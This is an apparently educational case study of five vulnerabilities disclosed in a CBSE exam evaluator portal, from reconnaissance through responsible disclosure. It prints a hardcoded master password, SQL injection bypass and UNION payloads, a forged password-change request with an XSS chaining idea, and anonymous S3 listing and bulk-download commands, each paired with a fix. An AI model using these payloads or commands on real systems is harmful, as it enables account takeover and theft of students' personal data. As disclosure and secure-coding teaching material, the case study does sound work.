📖 This case study documents publicly disclosed vulnerabilities that were reported to CBSE and CERT-In. The methods are shown for education — understanding what was found and how it was fixed makes every developer a better defender.

Discovery & Disclosure Timeline

🔍 Phase 1 — Passive Reconnaissance
Student opens the CBSE evaluator portal in a browser. Opens DevTools → Sources. Searches the JavaScript bundle for keywords like password, master, admin. Finds a hardcoded master credential inside minified JS — without sending a single malicious request.
🔓 Phase 2 — Authentication Analysis
Inspects the OTP flow in the Network tab. Discovers the OTP value is returned directly in the server's JSON response — readable without a phone. Confirms by reading the OTP from the browser console and logging in without the registered mobile number.
📝 Phase 3 — Account Takeover Chain
Tests the password reset endpoint — submits garbage as the "current password." Server accepts it and changes the password. Combined with the OTP bypass, any evaluator or principal account can be fully taken over permanently.
📊 Phase 4 — Database Access via SQLi
Login form concatenates user input directly into the SQL query. Classic payload ' OR '1'='1'-- in the username field bypasses authentication entirely. UNION queries expose table structure — students, evaluators, answer sheets all accessible.
☁️ Phase 5 — AWS Bucket Enumeration
AWS S3 bucket URL found in the JS source (or via subdomain brute-force). Running aws s3 ls --no-sign-request returns a full directory listing of all files — 2026 answer sheets, question papers, and a CSV export of all student marks — with zero authentication required.
✅ Phase 6 — Responsible Disclosure
Student stops. Documents only enough to prove each vulnerability (1–2 screenshots per flaw). Writes a professional report. Emails CBSE IT Cell and CERT-In simultaneously. Does NOT post on social media, does NOT download bulk data, does NOT demand money. CBSE patches. IIT Kanpur's cybersecurity research team recognises the work and extends a collaboration offer.

The 5 Vulnerabilities — Technical Deep Dive

🔑 Flaw 1 — Hardcoded Master Password in JS Source
CWE-259 • Universal credential visible to any browser
Critical ⌄

A universal password was embedded directly inside the website's JavaScript bundle — downloadable by any browser without authentication. This single credential unlocked every evaluator and principal dashboard.

What DevTools → Sources showed
// Inside minified JS bundle (app.bundle.min.js): var MASTER_PASS = "cbse@master2026"; function checkLogin(inputPass) { if (inputPass === MASTER_PASS) { // ← auth in browser = trivially bypassable grantAccess(); } }
❌ Why this is catastrophic
Any visitor — student, parent, attacker — can press F12 and log in as any evaluator or principal. No username needed. Affects every single account on the platform.
✔ Correct pattern
Auth logic lives server-side only. Client submits credentials, server compares against bcrypt hash in database. Client never sees the comparison logic.
✅
Fix: Remove all credentials from frontend code. Store hashed passwords server-side only. Use environment variables for any service credentials. Run trufflehog on every build to catch leaks before deployment.
📲 Flaw 2 — Client-Side OTP Verification
CWE-602 • OTP value returned in server response / stored in browser
Critical ⌄

The OTP sent to the user's phone was also included in the server's HTTP response — visible in the browser's Network tab. Authentication could be bypassed without ever accessing the registered phone.

Network tab — what the server returned
// POST /api/send-otp response: HTTP/1.1 200 OK Content-Type: application/json { "status": "otp_sent", "otp": "847291", // ← OTP visible in response! "expires_in": 300 }
Bypass — read OTP from browser console
// DevTools → Console: console.log(window._currentOTP); // prints "847291" // Or intercept with Burp Suite → read from response body
✅
Fix: Generate and store OTP server-side only. Never include it in the response. Client sends its guess → server compares internally. Rate-limit to 3 attempts, expire after 5 minutes. For best security, use TOTP (RFC 6238 — Google Authenticator).
📝 Flaw 3 — No Old Password Verification on Reset
CWE-620 • Password change accepts any value for "current password"
High ⌄

The password change endpoint accepted any string — including empty values and random text — as the "current password" field, and still updated the password. Combined with a session hijack, this enables permanent account takeover.

Exploit via Burp Suite — intercept & modify
// POST /api/change-password — with victim's session cookie: POST /api/change-password HTTP/1.1 Cookie: session=victim_session_abc123 Content-Type: application/json { "old_password": "AAAAAAAAAA", // ← completely wrong, server ignores it "new_password": "hacked_by_attacker" } // Server responds: { "status": "password changed successfully" } // ← accepted!
⚠ Chained with XSS: an attacker injects a script that silently sends this request from the victim's browser — changing their password without them knowing. No interaction required after the XSS fires.
✅
Fix: Always verify the current password server-side before allowing a change. Add CSRF tokens to all state-changing endpoints. Notify user by email/SMS immediately after any password change. Invalidate all other sessions.
📊 Flaw 4 — SQL Injection on Login Portal
CWE-89 • Unsanitized input concatenated directly into SQL query
Critical ⌄

The login form failed to sanitize input before using it in SQL queries. A single-quote in the username field broke out of the string context, and a comment (--) disabled the rest of the query — including the password check.

Authentication bypass
// Vulnerable backend (PHP example): $query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'" . "AND password='" . $_POST['password'] . "'"; // Attacker enters: Username: admin'-- Password: anything // Resulting query: SELECT * FROM users WHERE username='admin'--' AND password='anything' -- ↑ everything after -- is a comment → password check removed -- Returns admin row → login successful
Extracting all table names (UNION attack)
Username: ' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database()-- // Returns list of all tables: students, evaluators, answer_sheets, question_papers, admin_users
✅
Fix: Parameterized queries — always. SELECT * FROM users WHERE username = ? — the driver handles escaping. Also: minimum-privilege DB user (no DROP/INSERT on auth queries), WAF as secondary layer.
☁️ Flaw 5 — Public AWS S3 Bucket
CWE-284 • ListObjectsV2 worked with no authentication — answer sheets & question papers exposed
Critical ⌄

The S3 bucket storing 2026 board exam answer sheets and question papers was configured with public read access. Anyone on the internet could list and download every file — with no AWS account or credentials required.

Anonymous directory listing — what the attacker saw
# --no-sign-request = no AWS credentials required: aws s3 ls s3://cbse-exam-data-2026/ --no-sign-request # Output (partial): 2026-03-01 answer_keys/class12/physics-set-A.pdf 2026-03-01 answer_keys/class12/chemistry-set-B.pdf 2026-03-01 answer_keys/class12/maths-set-C.pdf 2026-03-01 question_papers/preleak/english-core.pdf 2026-03-01 student_data/marks-export-all-27M.csv ← 27 million records
Download any file without login
# Download entire bucket anonymously: aws s3 sync s3://cbse-exam-data-2026/ ./local-copy/ --no-sign-request # Or via plain HTTPS (no AWS CLI needed): curl https://cbse-exam-data-2026.s3.amazonaws.com/answer_keys/class12/physics-set-A.pdf
⚠ Immediate consequence: 2026 question papers were exposed before the exams. Answer keys were downloadable. 27M student records (name, roll number, school, marks, DOB) were in a public CSV.
✅
Fix: Enable "Block all public access" in AWS S3 bucket settings. Bucket policy must deny all anonymous access. Use pre-signed URLs with expiry for legitimate downloads. Enable AWS Macie to auto-detect sensitive data. Set up CloudTrail + S3 access logs.

What Made This Ethical Hacking — Not a Crime

❌ Did NOT do
  • ❌ Download bulk student records
  • ❌ Post evidence on social media / WhatsApp
  • ❌ Sell the vulnerabilities
  • ❌ Demand money from CBSE
  • ❌ Access more data than needed to prove the bug
  • ❌ Share question papers with students
  • ❌ Return after the initial proof-of-concept
✔ DID do
  • ✔ Documented with minimal proof screenshots
  • ✔ Reported directly to CBSE IT Cell
  • ✔ CC'd CERT-In for official record
  • ✔ Waited for acknowledgement before any disclosure
  • ✔ Provided clear steps to reproduce + suggested fixes
  • ✔ Cooperated fully with remediation team
  • ✔ Kept all communication records as legal protection
🎖 This distinction — the 60 seconds of decision-making after finding the vulnerability — is the entire difference between a criminal charge under IT Act §66 and a recognition letter from IIT Kanpur.
